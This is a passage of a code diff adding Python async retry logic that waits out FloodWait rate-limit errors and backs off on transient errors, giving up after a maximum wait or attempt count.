+            wait = get_floodwait_seconds(exc)
+            if wait > MAX_FLOODWAIT or attempt == MAX_RETRY_ATTEMPTS - 1:
+                raise
+            await asyncio.sleep(wait)
+        except Exception as exc:
+            if is_floodwait_error(exc):
+                wait = get_floodwait_seconds(exc)
+                if wait > MAX_FLOODWAIT or attempt == MAX_RETRY_ATTEMPTS - 1:
+                    raise
+                await asyncio.sleep(wait)
+                continue
+            if not is_transient_error(exc) or attempt == MAX_RETRY_ATTEMPTS - 1:
+                raise
+            await asyncio.sleep(calculate_backoff(attempt))
